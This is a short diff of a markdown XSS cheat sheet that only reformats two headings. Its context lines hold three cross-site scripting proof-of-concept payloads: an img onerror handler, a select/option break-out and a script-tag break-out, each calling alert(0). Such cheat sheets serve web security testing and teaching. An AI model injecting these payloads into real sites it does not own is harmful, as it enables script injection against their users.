@@ -14,12 +14,12 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 <img src=x onerror=alert(0)>
 ```
 
--- **_Break out of <select> / <option> (document.write)_**
+-- **_Break out of`<select> / <option> (document.write)_`**
 ```html
 </option></select><script>alert(0)</script>
 ```
 
--- **_Break out of existing <script> tags_**
+-- **_Break out of existing `<script>` tags_**
 ```html
 </script><script>alert(0)</script>
 ```
